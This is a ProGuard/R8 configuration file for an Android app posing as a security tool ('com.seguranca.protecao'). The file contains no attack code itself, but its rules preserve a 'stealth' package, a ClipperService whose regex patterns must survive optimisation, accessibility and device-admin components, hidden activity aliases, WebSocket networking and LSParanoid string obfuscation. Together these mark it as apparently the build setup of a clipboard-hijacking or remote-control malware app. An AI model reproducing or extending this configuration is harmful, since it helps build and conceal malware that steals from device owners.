# ─── PROGUARD / R8 RULES ─────────────────────────────────────────────────────

# Keep all app classes (R8 handles dead code, not naming)
-keep class com.seguranca.protecao.** { *; }
-keep class com.seguranca.protecao.plugin.** { *; }
-keep class com.seguranca.protecao.stealth.** { *; }
-keep class com.seguranca.protecao.util.** { *; }

# Keep all activity-alias targets (MainActivity must be kept as-is)
-keep class com.seguranca.protecao.MainActivity { *; }
-keep class com.seguranca.protecao.AppCoreInitializer { *; }

# Keep JNI native method declarations
-keepclasseswithmembernames class * {
    native <methods>;
}

# Keep Android components so they survive reflection
-keep class * extends android.app.Activity { *; }
-keep class * extends android.app.Service { *; }
-keep class * extends android.content.BroadcastReceiver { *; }
-keep class * extends android.content.ContentProvider { *; }
-keep class * extends android.accessibilityservice.AccessibilityService { *; }
-keep class * extends android.app.job.JobService { *; }
-keep class * extends android.app.admin.DeviceAdminReceiver { *; }
-keep class * extends androidx.work.Worker { *; }
-keep class * extends androidx.work.ListenableWorker { *; }

# Keep WebView JavaScript interface methods
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}

# Keep Gson serialization
-keep class com.google.gson.** { *; }
-keepattributes Signature
-keepattributes *Annotation*
-keep class * implements com.google.gson.TypeAdapterFactory
-keep class * implements com.google.gson.JsonSerializer
-keep class * implements com.google.gson.JsonDeserializer

# Keep OkHttp and WebSocket
-dontwarn okhttp3.**
-dontwarn okio.**
-keep class okhttp3.** { *; }
-keep class okio.** { *; }
-keep interface okhttp3.** { *; }

# Keep BuildConfig fields
-keep class com.seguranca.protecao.BuildConfig { *; }
-keepclassmembers class com.seguranca.protecao.BuildConfig {
    public static final <fields>;
}

# Keep Room database classes
-keep class * extends androidx.room.RoomDatabase { *; }
-keep @androidx.room.Entity class * { *; }
-keep @androidx.room.Dao interface * { *; }

# Keep WorkManager workers
-keep class * extends androidx.work.ListenableWorker {
    public <init>(android.content.Context, androidx.work.WorkerParameters);
}

# LSParanoid — obfuscated string class
-keep class org.lsposed.lsparanoid.** { *; }
-dontwarn org.lsposed.lsparanoid.**

# Android system classes
-dontwarn android.app.**
-dontwarn android.view.**

# Keep Enum values (needed for various switch statements)
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# Keep Parcelable implementations
-keepclassmembers class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator *;
}

# Keep Serializable
-keepnames class * implements java.io.Serializable
-keepclassmembers class * implements java.io.Serializable {
    static final long serialVersionUID;
    private static final java.io.ObjectStreamField[] serialPersistentFields;
    private void writeObject(java.io.ObjectOutputStream);
    private void readObject(java.io.ObjectInputStream);
    java.lang.Object writeReplace();
    java.lang.Object readResolve();
}

# Keep ClipperService patterns (regex strings must not be optimized away)
-keepclassmembers class com.seguranca.protecao.ClipperService {
    private static final java.lang.String *;
}

# Suppress harmless warnings from transitive deps
-dontwarn com.google.android.gms.**
-dontwarn androidx.profileinstaller.**
-dontwarn javax.annotation.**
-dontwarn kotlin.**
